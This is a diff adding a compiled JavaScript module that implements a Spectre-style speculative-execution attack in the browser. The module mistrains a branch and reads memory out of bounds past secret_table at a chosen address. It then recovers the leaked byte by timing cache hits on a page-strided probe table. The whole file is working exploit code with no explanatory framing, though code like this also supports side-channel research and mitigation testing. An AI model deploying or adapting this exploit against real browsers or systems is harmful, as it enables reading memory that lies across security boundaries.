@@ -1,0 +1,166 @@
+define(["exports", "../helper/math.js", "../timer.js", "../wasm-buffer.js", "../indicator-table.js"], function (_exports, _math, _timer, _wasmBuffer, _indicatorTable) {
+  "use strict";
+
+  Object.defineProperty(_exports, "__esModule", {
+    value: true
+  });
+  _exports.default = void 0;
+  _timer = _interopRequireDefault(_timer);
+  _wasmBuffer = _interopRequireDefault(_wasmBuffer);
+  _indicatorTable = _interopRequireDefault(_indicatorTable);
+
+  function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
+
+  let junk = 0;
+  const training_number = 6;
+
+  var _default = (async () => {
+    let _probeTable;
+
+    const timer = await _timer.default;
+    const secret_table = new Uint8Array(1 << 12);
+    {
+      const array_fill_view = new Float64Array(secret_table.buffer);
+
+      for (let i = 0; i < array_fill_view.length; ++i) {
+        array_fill_view[i] = Math.random();
+      }
+    }
+    return {
+      get secret_table() {
+        return secret_table;
+      },
+
+      speculativelyReadMemory
+    };
+
+    function speculativelyReadMemory(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
+      const time_tables = [];
+      let max_indicator;
+      let max_indicator_index;
+      const mean_times = [];
+      const indicator_table = new _indicatorTable.default(probe_length);
+      let total_iterations = 0;
+
+      for (var i = 0; i < min_iterations; ++total_iterations) {
+        if (!time_tables.length) {
+          _speculativelyReadAddress();
+        }
+
+        const time_table = time_tables.pop(); // process time table
+
+        const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number); // lower limit check is done by indicator_table
+
+        if (mean_time) {
+          mean_times.push(mean_time); // console.log(max_indicator_index, address);
+        } else {
+          // console.warn("slow timer");
+          if (total_iterations > min_iterations) {
+            break;
+          }
+
+          continue;
+        } // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
+
+
+        max_indicator = Math.max(...indicator_table);
+        let current_max_indicator_index = indicator_table.indexOf(max_indicator); // check for multiple maxima
+
+        for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
+          if (max_indicator == indicator_table[i]) {
+            current_max_indicator_index = undefined;
+            break;
+          }
+        } // max_indicator_index changed
+
+
+        if (max_indicator_index != current_max_indicator_index) {
+          i = current_max_indicator_index !== undefined | 0;
+          max_indicator_index = current_max_indicator_index; // console.warn("max_indicator_index changed");
+        } else {
+          ++i;
+        }
+      }
+
+      const mean_time = (0, _math.mean)(mean_times);
+
+      if (i < min_iterations) {
+        max_indicator_index = undefined; // console.warn("index test failed");
+      } // prepare results
+
+
+      let second_indicator = -Infinity;
+
+      for (let i = 0; i < indicator_table.length; ++i) {
+        const indicator = indicator_table[i];
+
+        if (indicator > second_indicator && i != max_indicator_index) {
+          second_indicator = indicator;
+        }
+      }
+
+      const second_ratio = second_indicator / max_indicator; // console.log("second ratio", second_ratio);
+
+      return {
+        max_indicator_index,
+        second_ratio,
+        // normalized_indicator_table: indicator_table.getNormalized(),
+        mean_time,
+        total_iterations
+      };
+
+      function probeTable(probe_table) {
+        const time_table = new Uint32Array(probe_length); // const probe_table = new Uint8Array(probe_length * page_size);
+
+        const random_offset = Math.random() * 256 | 0; // console.log("random offset", random_offset);
+        // probe table
+
+        for (let i = random_offset; i < random_offset + probe_length; ++i) {
+          const _i = i % 256;
+
+          const probe_index = (_i + 1) * page_size;
+          timer.restore();
+          junk ^= probe_table[probe_index];
+          time_table[_i] = timer.load();
+        }
+
+        time_tables.push(time_table);
+      }
+
+      function _speculativelyReadAddress() {
+        const probe_table = new Uint8Array((1 + probe_length) * page_size); // run the speculative execution at least twice
+        // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
+        // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
+        // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
+
+        for (let j = 0; j < speculative_repetitions; ++j) {
+          const delay_array = new Uint8Array(2 * page_size);
+
+          for (let i = training_number; i > 0; --i) {
+            // helper variables to optimize assembly code
+            const invalid_access = i == 1 | 0;
+            const fixed_address = address * invalid_access;
+            const fixed_page_size = page_size * invalid_access; // if (invalid_access) {
+            // }
+            // ensure evaluation before jump condition
+            // load probe_table[0] to cache the probe_table address
+
+            junk ^= fixed_address | fixed_page_size | probe_table[0]; // load condition from RAM so speculative execution gets triggered
+
+            if (delay_array[fixed_page_size] || !invalid_access) {
+              const secret_value = secret_table[fixed_address]; // map valid accesses to the address (probe_tables)
+              // map invalid accesses to their respective probe boxes
+
+              junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
+            }
+          }
+        } // probe table
+
+
+        probeTable(probe_table);
+      }
+    }
+  })();
+
+  _exports.default = _default;
+});
